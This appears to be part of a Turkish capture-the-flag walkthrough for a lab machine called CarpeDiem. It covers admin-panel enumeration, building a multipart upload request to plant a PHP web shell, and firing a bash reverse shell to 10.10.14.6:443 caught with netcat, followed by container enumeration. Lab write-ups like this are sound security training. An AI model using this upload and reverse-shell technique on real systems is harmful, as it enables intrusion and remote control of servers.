@@ -463,3 +463,209 @@ Sitede dolaşırken herhangi bir değişiklik fark edilmiyor ve **/admin** hala 
 
 Ancak, kullanıcıma ait **login_type** değerini 1 olarak değiştirdiğimde, **/admin** sayfası yükleniyor!
 
+
+### /admin Enumeration
+
+#### Overview
+
+Admin panelinde bir Dashboard ve bir dizi başka sayfa vardır:
+
+![Pasted image 20250108015538.png](/img/user/Pasted%20image%2020250108015538.png)
+
+“Bike List” sayfası, bisikletlerin bulunduğu DB'deki tablo üzerinde bir GUI'ye benziyor:
+
+![Pasted image 20250108020238.png](/img/user/Pasted%20image%2020250108020238.png)
+
+Herhangi bir şeyi gerçekten düzenlemeye çalıştığımda hata veriyor.
+
+“Booking List” bölümünde benimki de dahil olmak üzere bir sürü rezervasyon görünüyor ama XSS denediğim rezervasyonlar görünmüyor:
+
+![Pasted image 20250108020333.png](/img/user/Pasted%20image%2020250108020333.png)
+
+"Booking Report" sayfası, yalnızca bazı filtrelerle aynı veriyi gösteriyor.
+
+"Brand List" ve "Category List" sayfaları, "Bike List" ile oldukça benzer. "Settings" sayfasında başlık, "About Us" metni, kapak resimleri gibi değerler bulunuyor. Ancak bu sayfada bir kaydetme düğmesi yok.
+
+
+#### Submit Trudesk Ticket
+
+"Submit Trudesk Ticket" ilginç görünüyor, ancak aslında işe yaramayan bir form:
+
+![Pasted image 20250108020635.png](/img/user/Pasted%20image%2020250108020635.png)
+
+En üstte şöyle yazıyor:
+
+NOT: Trudesk entegrasyonu henüz uygulanmamıştır. Lütfen tüm taleplerinizi doğrudan Trudesk'e iletin.
+
+Raw HTML'e baktığımızda, orada bir form var:
+
+![Pasted image 20250108020848.png](/img/user/Pasted%20image%2020250108020848.png)
+
+Boş bir `action` değeri, formun mevcut URL'ye gönderileceği anlamına gelir, bu da **/admin/?page=maintenance/helpdesk** oluyor. Bu form gönderimini manuel olarak yeniden oluşturabilirim, ancak gönderdiğim herhangi bir şey bu sayfada herhangi bir farklılık göstermiyor gibi görünüyor. Arka planda bir şeyler olabilir, ancak şu an için bir şeyler yapmak adına elimde yeterli veri yok.
+
+
+#### Querterly Report Upload (Querterly Rapor Yükleme)
+
+Bu sayfada yükleme fonksiyonlarının hala geliştirme aşamasında olduğu yazıyor:
+
+![Pasted image 20250108021203.png](/img/user/Pasted%20image%2020250108021203.png)
+
+
+“Action” menüsü birkaç seçenek sunuyor, ancak “View” ve “Edit” pek bir şey yapmıyor gibi görünüyor:
+
+![Pasted image 20250108021725.png](/img/user/Pasted%20image%2020250108021725.png)
+
+Hem “ Add” (Ekle) hem de “Delete” (Sil) bir uyarı gösterir:
+
+
+![Pasted image 20250108021745.png](/img/user/Pasted%20image%2020250108021745.png)
+
+Her biri için “ Continue” (Devam) düğmesine tıklandığında bir hata mesajı görüntülenir:
+
+![Pasted image 20250108021805.png](/img/user/Pasted%20image%2020250108021805.png)
+
+"Delete" seçeneği, **/classes/User.php?f=delete_file** adresine bir POST isteği gönderiyor ve 200 OK yanıtı dönüyor, ancak yanıtın bir body'si yok, bu yüzden hatanın ne olduğunu anlayamıyorum.
+
+"Add" seçeneği ise **/classes/User.php?f=upload** adresine bir POST isteği gönderiyor ve bu da 200 OK yanıtı dönüyor. Ancak, bu isteğin bir body'si var:
+
+```
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Mon, 28 Nov 2022 18:54:37 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.4.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 40
+
+{"error":"multipart\/form-data missing"}
+```
+
+
+### Webshell Upload
+
+#### Form Data Background
+
+Upload isteğini Burp Repeater'a göndereceğim ve onu oluşturmaya başlayacağım. Form verileri [IETF RFC-7578](https://www.rfc-editor.org/rfc/rfc7578)'de tanımlanmıştır, ancak bu[ StackOverflow yanıtı](https://stackoverflow.com/a/8660740), burada biraz işaretlediğim kısa bir örnek vermek için iyi bir iş çıkarır:
+
+![Pasted image 20250108022221.png](/img/user/Pasted%20image%2020250108022221.png)
+
+Kırmızı ile gösterilen kısımda, `Content-Type` header'ı `multipart/form-data` olacak ve ardından çeşitli parametreleri ayırmak için kullanılan **`boundary`** tanımlanacak. Standart bir POST isteğinde bu `&` olurdu, ancak bir formda, her öğenin hem metadata hem de veri içermesine olanak tanır. Bu nedenle, her parametre bu dize ile ayrılır. Kullanılan her sınır dizesi (boundary) başına ek bir `--` ile önceden gelir ve son sınır dizisinin sonuna da `--`eklenir.
+
+Bu örnekteki ilk parametre (mavi etiket), sadece bir form değeridir. İlk satır metadata’dır ve `Content-Disposition: form-data` ile başlayarak, `;` ile ayrılmış bir dizi anahtar-değer çifti içerir. Buradaki `MAX_FILE_SIZE`, sunucunun bu öğeye referans vermesi için kullanılan bir ad (name) içerir.
+
+İkinci öğe, dosya adı ve `Content-Type` header'ı dahil olmak üzere tipik bir `filename` meta verisine sahiptir.
+
+ChatGPT'ye de bunu sormayı deneyeceğim ve o da güzel bir cevap verecek:
+
+File input içeren bir HTML formuyla ilişkili HTTP isteği neye benzer ? 
+
+![Pasted image 20250108023507.png](/img/user/Pasted%20image%2020250108023507.png)
+
+
+#### Build Upload Request
+
+İsteği **/classes/Users.php** adresine göndereceğim ve Repeater’da **Content-Type** başlığını ve örnekteki dosya öğesini ekleyeceğim. **Boundary** değerini değiştireceğim, bu da herhangi bir şey olabileceğini göstermek için yapılacak, ayrıca dosya hakkında metadata’yı biraz düzenleyeceğim:
+
+![Pasted image 20250108023805.png](/img/user/Pasted%20image%2020250108023805.png)
+
+Sunucu, `file_upload'un` eksik olduğunu belirten bir hata ile yanıt veriyor. Bu, büyük olasılıkla öğenin adına atıfta bulunuyor ve bu örnekte adı `uploadedfile` olarak geçiyor. Adı güncelleyeceğim ve bu işe yarıyor; bir yol (path) döndürüyor.
+
+![Pasted image 20250108032123.png](/img/user/Pasted%20image%2020250108032123.png)
+
+Bu dosya sunucuda:
+
+![Pasted image 20250108032408.png](/img/user/Pasted%20image%2020250108032408.png)
+
+Bu bölüm bazıları için sinir bozucu olabilir, çünkü farklı bir hata mesajı almak için `filename=something` içeren bir form **object**'ine sahip olmam gerekiyor. Bu, bir `<input type="file">` HTML etiketi tarafından oluşturulan standart form verisidir. Buradaki **name=file_upload** ise uygulamaya özel bir isimdir ve bu nedenle bu bilginin açığa çıkması için bir hata mesajına ihtiyaç duyulmaktadır.
+
+#### Upload Webshell
+
+Bu isteği bir PHP web shell içerecek şekilde güncelleyeceğim. Görünüşe göre, dosyanın adını koruyor ve ismin önüne bir sayı ekliyor. Bu yüzden, dosya adını **.php** ile bitecek şekilde değiştireceğim: 
+
+It works:
+
+![Pasted image 20250108040415.png](/img/user/Pasted%20image%2020250108040415.png)
+
+
+### Shell
+
+Komut olarak basit bir [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) koyacağım ve göndereceğim:
+
+```
+oxdf@hacky$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://portal.carpediem.htb/uploads/1669663920_0xdf.php
+```
+
+
+Bir **nc** dinleyicisinde bir shell elde edilir:
+
+```
+oxdf@hacky$ nc -lnvp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.167 46920
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@3c371615b7aa:/var/www/html/portal/uploads$ 
+```
+
+[Script / stty](https://www.youtube.com/watch?v=DqE6DxqJg8Q) numarası ile shell'i yükselteceğim:
+
+```
+www-data@3c371615b7aa:/var/www/html/portal/uploads$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+www-data@3c371615b7aa:/var/www/html/portal/uploads$ ^Z
+[1]+  Stopped                 nc -lnvp 443
+oxdf@hacky$ stty raw -echo; fg
+nc -lnvp 443
+            reset
+reset: unknown terminal type unknown
+Terminal type? screen
+www-data@3c371615b7aa:/var/www/html/portal/uploads$ 
+```
+
+
+### CarpeDiem'de hflaccus olarak Shell
+
+### Host Enumeration
+
+#### Docker
+
+Bu hostta pek bir şey yok ve açıkça bir Docker konteyneri:
+
+* Host adı CarpeDiem değil rastgele bir string.
+* System root'ta bir .dockerenv dosyası var.
+* ifconfig ve ip gibi yaygın komutlar eksik.
+
+#### General
+
+IP adresi, ==**/proc/net/fib_trie**== dosyasından **172.17.0.6** olarak bulunabilir (ancak bir yeniden başlatma/sıfırlama durumunda son oktetin değişmesi mümkün olabilir).
+
+==**/home**== dizininde herhangi bir kullanıcıya ait ana dizin bulunmamaktadır.
+
+==**/var/www/html**== dizininde, bu web sunucusunun uygulama kodlarını içeren bir **==portal==** dizini vardır. ==**carpediem.htb**== üzerinde görülen "Yakında Geliyor" sitesi ise bu konteynerde mevcut görünmüyor.
+
+
+#### Portal Site
+
+Portal.carpediem.htb için kaynağa baktığımızda, root dizininde bir config.php var:
+
+```
+www-data@3c371615b7aa:/var/www/html/portal$ ls
+404.html          build             index.php       privacy_policy.html
+about.html        classes           initialize.php  registration.php
+about.php         config.php        libs            success_booking.php
+admin             dist              login.php       uploads
+assets            edit_account.php  logout.php      view_bike.php
+bikes.php         home.php          my_account.php  view_categories.php
+book_to_rent.php  inc               plugins  
+```
+
+İçinde herhangi bir şifre yok, ancak en üstte bu satırlar var:
+
+```
+require_once('initialize.php');
+require_once('classes/DBConnection.php');
+```
